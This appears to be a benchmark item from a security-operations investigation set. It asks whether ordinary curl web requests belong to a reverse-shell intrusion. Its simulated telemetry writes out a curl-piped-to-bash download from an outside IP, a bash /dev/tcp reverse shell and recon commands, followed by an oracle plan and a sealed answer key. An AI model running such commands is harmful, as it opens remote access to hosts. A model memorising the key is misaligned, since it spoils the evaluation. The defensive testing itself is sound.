@@ -1,0 +1,292 @@
+{
+  "incident_id": "secops-q-c03-neg-benign-ua",
+  "name": "SecOps case-03-web-exploit-revshell/q-c03-neg-benign-ua",
+  "source_benchmark": "Cyber-SecOps-ES",
+  "source_scenario": "case-03-web-exploit-revshell/q-c03-neg-benign-ua",
+  "alert": {
+    "timestamp": "2026-07-29T02:54:17Z",
+    "host": "ubuntu-2404-noble-amd64-base",
+    "user": "unknown",
+    "alert_type": "secops_investigation",
+    "summary": "The web logs also contain ordinary requests with User-Agent `curl/8.5.0`. Should every request from a `curl` User-Agent in this window be treated as the attack?",
+    "attck": []
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "process_events",
+      "network",
+      "alerts"
+    ],
+    "start": "2026-07-29T02:54:17Z",
+    "end": "2026-07-29T02:54:19Z",
+    "hosts": [
+      "ubuntu-2404-noble-amd64-base"
+    ]
+  },
+  "telemetry": {
+    "process_events": [
+      {
+        "event_id": "evidence-b-0001-c97995c7",
+        "timestamp": "2026-07-29T02:54:17.700Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s3b.sh | bash"
+      },
+      {
+        "event_id": "evidence-b-0002-bc6ce837",
+        "timestamp": "2026-07-29T02:54:17.702Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s3b.sh"
+      },
+      {
+        "event_id": "evidence-b-0003-e3747567",
+        "timestamp": "2026-07-29T02:54:17.721Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "timeout",
+        "command_line": "bash -c bash -i >& /dev/tcp/204.168.178.42/9001 0>&1",
+        "attck": "T1059.004"
+      },
+      {
+        "event_id": "evidence-b-0004-5a60da2a",
+        "timestamp": "2026-07-29T02:54:17.723Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "bash",
+        "parent_process_name": "bash",
+        "command_line": "bash -i",
+        "note": "reverse shell"
+      },
+      {
+        "event_id": "evidence-b-0005-c6f8b114",
+        "timestamp": "2026-07-29T02:54:18.025Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "id",
+        "parent_process_name": "bash",
+        "command_line": "id"
+      },
+      {
+        "event_id": "evidence-b-0006-017acf0e",
+        "timestamp": "2026-07-29T02:54:18.028Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "hostname",
+        "parent_process_name": "bash",
+        "command_line": "hostname"
+      },
+      {
+        "event_id": "evidence-b-0007-1e1bbc22",
+        "timestamp": "2026-07-29T02:54:18.029Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "uname",
+        "parent_process_name": "bash",
+        "command_line": "uname -a"
+      },
+      {
+        "event_id": "evidence-b-0008-cf09f626",
+        "timestamp": "2026-07-29T02:54:18.031Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "head",
+        "parent_process_name": "bash",
+        "command_line": "head -3 /etc/passwd"
+      },
+      {
+        "event_id": "evidence-b-0009-bb3d3689",
+        "timestamp": "2026-07-29T02:54:18.032Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "process_name": "whoami",
+        "parent_process_name": "bash",
+        "command_line": "whoami"
+      }
+    ],
+    "network": [
+      {
+        "event_id": "evidence-net-0001-07248840",
+        "timestamp": "2026-07-29T02:54:17Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "destination_ip": "204.168.178.42",
+        "destination_port": 443,
+        "protocol": "tcp",
+        "note": "attacker_or_c2_indicator"
+      }
+    ],
+    "alerts": [
+      {
+        "event_id": "evidence-al-0001-83ee05ee",
+        "timestamp": "2026-07-29T02:51:18.659Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Hidden Payload Executed via Scheduled Job",
+        "severity": "critical",
+        "message": "case-01 cron persistence firing",
+        "raw_alert": {
+          "ts": "2026-07-29T02:51:18.659Z",
+          "rule": "Hidden Payload Executed via Scheduled Job",
+          "severity": "critical",
+          "note": "case-01 cron persistence firing"
+        }
+      },
+      {
+        "event_id": "evidence-al-0002-ec72795a",
+        "timestamp": "2026-07-29T02:54:18.666Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Potential Reverse Shell Activity via TCP/UDP Socket",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:54:18.666Z",
+          "rule": "Potential Reverse Shell Activity via TCP/UDP Socket",
+          "severity": "critical",
+          "count": 2
+        }
+      },
+      {
+        "event_id": "evidence-al-0003-c6759525",
+        "timestamp": "2026-07-29T02:54:18.657Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Egress Network Connection Followed by Command Execution",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:54:18.657Z",
+          "rule": "Egress Network Connection Followed by Command Execution",
+          "severity": "critical"
+        }
+      },
+      {
+        "event_id": "evidence-al-0004-63694c71",
+        "timestamp": "2026-07-29T02:54:18.686Z",
+        "host": "ubuntu-2404-noble-amd64-base",
+        "rule": "Suspicious File Downloaded by Curl/Wget and Piped to Interpreter",
+        "severity": "critical",
+        "message": "",
+        "raw_alert": {
+          "ts": "2026-07-29T02:54:18.686Z",
+          "rule": "Suspicious File Downloaded by Curl/Wget and Piped to Interpreter",
+          "severity": "critical"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "evidence-b-0001-c97995c7",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:54:17.700Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "bash",
+        "parent_process_name": ".sysupdate",
+        "command_line": "bash -c curl -s http://204.168.178.42:8080/s3b.sh | bash"
+      }
+    },
+    {
+      "event_id": "evidence-b-0002-bc6ce837",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:54:17.702Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "curl",
+        "parent_process_name": "bash",
+        "command_line": "curl -s http://204.168.178.42:8080/s3b.sh"
+      }
+    },
+    {
+      "event_id": "evidence-b-0003-e3747567",
+      "source": "process_events",
+      "timestamp": "2026-07-29T02:54:17.721Z",
+      "host": "ubuntu-2404-noble-amd64-base",
+      "fields": {
+        "process_name": "bash",
+        "parent_process_name": "timeout",
+        "command_line": "bash -c bash -i >& /dev/tcp/204.168.178.42/9001 0>&1",
+        "attck": "T1059.004"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "process_events",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "network",
+        "filter": {
+          "host": "ubuntu-2404-noble-amd64-base"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "The web logs also contain ordinary requests with User-Agent `curl/8.5.0`. Should every request from a `curl` User-Agent in this window be treated as the attack?",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "process_events",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "network",
+          "filter": {
+            "host": "ubuntu-2404-noble-amd64-base"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "The web logs also contain ordinary requests with User-Agent `curl/8.5.0`. Should every request from a `curl` User-Agent in this window be treated as the attack?",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-SecOps-ES",
+    "scenario": "case-03-web-exploit-revshell/q-c03-neg-benign-ua",
+    "answer": "",
+    "accept": [
+      ""
+    ],
+    "grading": "boolean",
+    "attck": [],
+    "sealed": true
+  }
+}
